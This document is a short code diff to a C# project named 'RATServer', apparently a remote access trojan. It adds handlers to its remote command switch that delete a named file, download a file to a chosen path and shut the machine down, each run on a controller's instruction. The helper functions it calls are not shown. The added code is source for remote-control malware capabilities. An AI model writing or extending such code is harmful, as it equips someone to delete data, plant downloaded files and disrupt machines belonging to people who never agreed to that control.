@@ -81,6 +81,20 @@ namespace RATServer
                             r.Type = "Message";
                             r.Msg = Functions.Processes();
                             break;
+                        case "delete":
+                            r.Type = "Message";
+                            r.Msg = Functions.Delete(c.Args[0]);
+                            break;
+                        case "download":
+                            Functions.Download(c.Args[0], c.Args[1]);
+                            r.Type = "Message";
+                            r.Msg = "Download Success";
+                            break;
+                        case "shutdown":
+                            Functions.ShutDown();
+                            r.Type = "Message";
+                            r.Msg = "Shutdown Success";
+                            break;                   
                         default:
                             break;
                     }                 
